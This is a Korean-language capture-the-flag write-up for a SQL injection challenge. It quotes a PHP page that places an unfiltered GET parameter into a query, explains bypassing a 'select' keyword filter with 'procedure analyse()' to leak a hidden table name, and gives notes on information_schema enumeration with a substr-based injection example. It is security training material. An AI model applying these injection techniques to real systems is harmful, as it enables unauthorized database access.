# 문제

- 소스

  ```php
  <?php
    include "../../config.php";
    if($_GET['view_source']) view_source();
  ?>
  <html>
  <head>
  <title>Challenge 53</title>
  </head>
  <body>
  <?php
    $db = dbconnect();
    include "./tablename.php";
    if($_GET['answer'] == $hidden_table) solve(53);
    if(preg_match("/select|by/i",$_GET['val'])) exit("no hack");
    $result = mysqli_fetch_array(mysqli_query($db,"select a from $hidden_table where a={$_GET['val']}"));
    echo($result[0]);
  ?>
  <hr><a href=./?view_source=1>view-source</a>
  </body>
  </html>
  ```
  
- get으로 val을 입력받고 select 쿼리문을 만든다.

- hiddentable 이름을 알아내면 clear

#  풀이

- `information_schema` 데이터베이스를 이용해 테이블 값을 알아내야 할것 같다.
  - `database()`함수가 안먹힌다..
- 다른 것 대부분도 일단 테이블 조회가 가능해야 한다
  - 하지만 select가 막혀있다.
- `procedure analyse()`만 가능하다
  - 쿼리 마지막에 넣어주면 테이블 이름이 나온다.
- 끝

# 알게된 것

### information_schema

- 모든(? 불확실) 테이블 등의 정보를 얻을 수 있다.
- 예시
  - `use information_schema;`
  - `select table_name from tables;`
- 다른 데이터베이스에서 접근하기
  - 테이블명 얻어오기
    - `select table_name from information_schema.tables;`

- 현재 DB의 테이블 이름 알아내기

  - DB정보 확인
    - `select database()`;
    - 실사용 예
      - `select * from myTable where no=-1 or substr((select database()),1,1)='m';`
  - 테이블 알아내기
    - `select table_name, table_schema from information_schema.tables`
      - `table_schema`: 테이블이 소속된(?) 데이터 베이스
    - 실사용 예
      - `select table_name from information_schema where table_schema = 'myDb'`

  

### 기타 유용한 함수

- `select database();`

  - 지금 사용중인 DB이름을 반환한다.

- `procedure  analyse()`

  - 현재 조회하는 테이블의 정보를 반환한다.

  - 실사용 예

    ```sql
    MariaDB [myDb]> select * from myTable where no=1 procedure analyse();
    +-----------------+-----------+-----------+------------+------------+------------------+-------+-------------------------+--------+------------------------+
    | Field_name      | Min_value | Max_value | Min_length | Max_length | Empties_or_zeros | Nulls | Avg_value_or_avg_length | Std    | Optimal_fieldtype      |
    +-----------------+-----------+-----------+------------+------------+------------------+-------+-------------------------+--------+------------------------+
    | myDb.myTable.id | admin     | admin     |          5 |          5 |                0 |     0 | 5.0000                  | NULL   | ENUM('admin') NOT NULL |
    | myDb.myTable.no | 1         | 1         |          1 |          1 |                0 |     0 | 1.0000                  | 0.0000 | ENUM('1') NOT NULL     |
    +-----------------+-----------+-----------+------------+------------+------------------+-------+-------------------------+--------+------------------------+
    2 rows in set (0.000 sec)
    
    
    ```

    

### 기타 유용한 스키마

- `mysql.innodb_table_stats`
  - 테이블 이름을 알수있음
- `information_schema.processlist`
  - 입력한 쿼리를 확인할 수 있다.



### LIMIT

- 출력되는 행의 개수를 제한한다.
- 예시
  - `select * from myTable limit 3`
    - 3개만 표시
  - `select * from myTable limit 3,3`
    - 3번째 행부터 3개만 표시